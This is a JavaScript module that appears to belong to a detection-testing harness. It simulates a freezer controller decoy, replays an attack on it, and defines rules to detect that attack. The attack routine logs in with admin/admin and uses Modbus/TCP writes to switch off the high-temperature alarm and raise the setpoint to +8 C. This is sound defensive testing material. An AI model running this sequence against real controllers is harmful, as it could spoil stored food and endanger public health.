'use strict';
// Cold-chain OT scenario, modelled on the November 2026 attacks on supermarket
// refrigeration controllers: an exposed controller with factory credentials,
// its alarm silenced and its setpoint raised over Modbus/TCP.
//
// The decoy is a simulated freezer controller (HTTP panel + Modbus/TCP).
// Nothing here talks to real equipment.
const net = require('net');
const http = require('http');
const { sleep, cleanAddr, httpReq, listen, close } = require('../lib/harness');

const REG = { SETPOINT: 0, TEMP: 1, ALARM_ENABLE: 2, DEFROST: 3 };
const SAFE_SETPOINT = [-250, -150]; // tenths of a degree C
const HIGH_TEMP_ALARM = -120;

function exception(frame, code) {
  const out = Buffer.alloc(9);
  frame.copy(out, 0, 0, 4);
  out.writeUInt16BE(3, 4);
  out[6] = frame[6];
  out[7] = frame[7] | 0x80;
  out[8] = code;
  return out;
}

function handleFrame(frame, regs, src, bus) {
  const fc = frame[7];
  if (frame.length < 12) return exception(frame, 3);
  const addr = frame.readUInt16BE(8);
  const arg = frame.readUInt16BE(10);
  if (fc === 3) {
    if (arg < 1 || addr + arg > regs.length) return exception(frame, 2);
    bus.emit('controller', 'modbus.read', { src, addr, qty: arg });
    const out = Buffer.alloc(9 + arg * 2);
    frame.copy(out, 0, 0, 4);
    out.writeUInt16BE(3 + arg * 2, 4);
    out[6] = frame[6];
    out[7] = 3;
    out[8] = arg * 2;
    for (let i = 0; i < arg; i++) out.writeInt16BE(regs[addr + i], 9 + i * 2);
    return out;
  }
  if (fc === 6) {
    if (addr >= regs.length || addr === REG.TEMP) return exception(frame, 2);
    const value = frame.readInt16BE(10);
    const previous = regs[addr];
    regs[addr] = value;
    bus.emit('controller', 'modbus.write', { src, addr, value, previous });
    return Buffer.from(frame.subarray(0, 12));
  }
  return exception(frame, 1);
}

async function start(bus, { bind, ports }) {
  const regs = new Int16Array([-180, -180, 1, 0]);

  const tick = setInterval(() => {
    const diff = regs[REG.SETPOINT] - regs[REG.TEMP];
    if (diff !== 0) regs[REG.TEMP] += Math.sign(diff) * Math.min(10, Math.abs(diff));
    bus.emit('controller', 'process.temp', { temp: regs[REG.TEMP], alarmEnabled: regs[REG.ALARM_ENABLE] === 1 });
    if (regs[REG.ALARM_ENABLE] === 1 && regs[REG.TEMP] > HIGH_TEMP_ALARM) {
      bus.emit('controller', 'device.alarm', { temp: regs[REG.TEMP] });
    }
  }, 100);

  const modbus = net.createServer((sock) => {
    const src = cleanAddr(sock.remoteAddress);
    let buf = Buffer.alloc(0);
    sock.on('error', () => {});
    sock.on('data', (d) => {
      buf = Buffer.concat([buf, d]);
      while (buf.length >= 8) {
        const total = 6 + buf.readUInt16BE(4);
        if (buf.length < total) break;
        const frame = buf.subarray(0, total);
        buf = buf.subarray(total);
        sock.write(handleFrame(frame, regs, src, bus));
      }
    });
  });

  const panel = http.createServer((req, res) => {
    const src = cleanAddr(req.socket.remoteAddress);
    res.setHeader('Server', 'ColdCtl-Sim/1.0 (emulation decoy)');
    if (req.url === '/status') {
      const auth = Buffer.from((req.headers.authorization || '').replace(/^Basic /, ''), 'base64').toString();
      const user = auth.split(':')[0];
      const ok = auth === 'admin:admin';
      if (auth) bus.emit('controller', 'http.auth', { src, user, success: ok });
      if (!ok) {
        res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="ColdCtl"' });
        res.end();
        return;
      }
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ setpoint: regs[0] / 10, temp: regs[1] / 10, alarmEnabled: regs[2] === 1, modbusPort: modbus.address().port }));
      return;
    }
    bus.emit('controller', 'http.request', { src, path: req.url });
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<title>ColdCtl freezer controller</title>');
  });

  const live = {
    http: await listen(panel, ports.http, bind),
    modbus: await listen(modbus, ports.modbus, bind),
  };
  return {
    ports: live,
    state: () => ({ setpoint: regs[0] / 10, temp: regs[1] / 10, alarmEnabled: regs[2] === 1 }),
    stop: async () => {
      clearInterval(tick);
      await close(panel);
      await close(modbus);
    },
  };
}

function modbusCall({ host, port, fc, addr, value, localAddress }) {
  return new Promise((resolve) => {
    const sock = net.connect({ host, port, localAddress });
    const req = Buffer.alloc(12);
    req.writeUInt16BE(1, 0);
    req.writeUInt16BE(6, 4);
    req[6] = 1;
    req[7] = fc;
    req.writeUInt16BE(addr, 8);
    req.writeInt16BE(value, 10);
    sock.setTimeout(5000, () => sock.destroy());
    sock.on('connect', () => sock.write(req));
    sock.on('data', (d) => { sock.end(); resolve(d); });
    sock.on('error', () => resolve(null));
    sock.on('close', () => resolve(null));
  });
}

// Normal operation: the building-management poller reads the registers and
// never writes. Any alert raised here is a false positive.
async function baseline({ host, ports, src }) {
  for (let i = 0; i < 6; i++) {
    await modbusCall({ host, port: ports.modbus, fc: 3, addr: 0, value: 4, localAddress: src });
    await sleep(100);
  }
}

async function attack(bus, { host, ports, src }) {
  bus.step('fingerprint', 'T0888', 'Identify the controller from its web panel banner');
  await httpReq({ host, port: ports.http, path: '/', localAddress: src });

  bus.step('default-login', 'T0812', 'Log in to the panel with factory credentials admin/admin');
  await httpReq({
    host, port: ports.http, path: '/status', localAddress: src,
    headers: { Authorization: 'Basic ' + Buffer.from('admin:admin').toString('base64') },
  });

  bus.step('modbus-read', 'T0861', 'Read holding registers to map setpoint and alarm points');
  await modbusCall({ host, port: ports.modbus, fc: 3, addr: 0, value: 4, localAddress: src });

  bus.step('alarm-inhibit', 'T0838', 'Disable the high-temperature alarm');
  await modbusCall({ host, port: ports.modbus, fc: 6, addr: REG.ALARM_ENABLE, value: 0, localAddress: src });

  bus.step('setpoint-write', 'T0836', 'Raise the freezer setpoint from -18.0 C to +8.0 C');
  await modbusCall({ host, port: ports.modbus, fc: 6, addr: REG.SETPOINT, value: 80, localAddress: src });

  // Let the simulated cabinet warm up so the process-level rule can be timed.
  await sleep(1200);
}

const untrusted = (state, src) => state.trusted && !state.trusted.includes(src);
const withTrusted = ({ trusted }) => ({ trusted: trusted && trusted.length ? trusted : null });

const rules = [
  {
    id: 'CC-01', title: 'Controller panel reached from an untrusted address', severity: 'medium', technique: 'T0883',
    detects: ['fingerprint'], init: withTrusted,
    match: (e, s) => e.type === 'http.request' && untrusted(s, e.src) && `src=${e.src}`,
  },
  {
    id: 'CC-02', title: 'Panel login with the factory account', severity: 'high', technique: 'T0812',
    detects: ['default-login'],
    match: (e) => e.type === 'http.auth' && e.success && e.user === 'admin' && `src=${e.src}`,
  },
  {
    id: 'CC-03', title: 'Modbus client outside the trusted master list', severity: 'high', technique: 'T0886',
    detects: ['modbus-read', 'alarm-inhibit', 'setpoint-write'], init: withTrusted,
    match: (e, s) => e.type.startsWith('modbus.') && untrusted(s, e.src) && `src=${e.src}`,
  },
  {
    id: 'CC-04', title: 'High-temperature alarm disabled over Modbus', severity: 'critical', technique: 'T0838',
    detects: ['alarm-inhibit'],
    match: (e) => e.type === 'modbus.write' && e.addr === REG.ALARM_ENABLE && e.value === 0 && `src=${e.src}`,
  },
  {
    id: 'CC-05', title: 'Setpoint written outside the safe band', severity: 'critical', technique: 'T0836',
    detects: ['setpoint-write'],
    match: (e) => e.type === 'modbus.write' && e.addr === REG.SETPOINT
      && (e.value < SAFE_SETPOINT[0] || e.value > SAFE_SETPOINT[1])
      && `setpoint ${e.previous / 10} C -> ${e.value / 10} C`,
  },
  {
    // Last line of defence: independent of the device's own alarm, which the
    // attacker has just switched off.
    id: 'CC-06', title: 'Cabinet temperature above limit (independent of device alarm)', severity: 'critical', technique: 'T0836',
    detects: ['setpoint-write'],
    match: (e) => e.type === 'process.temp' && e.temp > HIGH_TEMP_ALARM
      && `temp ${e.temp / 10} C, device alarm ${e.alarmEnabled ? 'on' : 'OFF'}`,
  },
];

module.exports = {
  id: 'cold-chain',
  title: 'Refrigeration controller takeover (OT)',
  inspiredBy: 'Hacktivist attacks on supermarket refrigeration controllers, Nov 2026',
  portNames: ['http', 'modbus'],
  start, baseline, attack, rules,
};
